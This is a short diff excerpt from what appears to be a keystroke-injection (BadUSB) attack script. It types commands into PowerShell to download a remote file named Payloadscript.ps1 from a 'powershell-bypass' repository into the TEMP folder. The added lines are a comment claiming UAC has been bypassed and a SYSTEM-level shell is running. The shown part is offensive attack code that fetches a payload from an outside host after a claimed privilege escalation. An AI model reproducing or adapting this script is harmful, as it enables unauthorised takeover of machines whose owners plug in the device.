@@ -47,6 +47,9 @@ QUACK ENTER
 QUACK DELAY 300
 QUACK STRING "powershell"
 QUACK ENTER
+
+REM UAC Bypassed now we have a sys32 powershell proc running
+
 QUACK STRING "$scriptUrl = 'https://raw.githubusercontent.com/GHXSTFPS/powershell-bypass/main/V1/Payloadscript.ps1'"
 QUACK ENTER
 QUACK STRING "$dest = $env:TEMP + '\Payloadscript.ps1'"
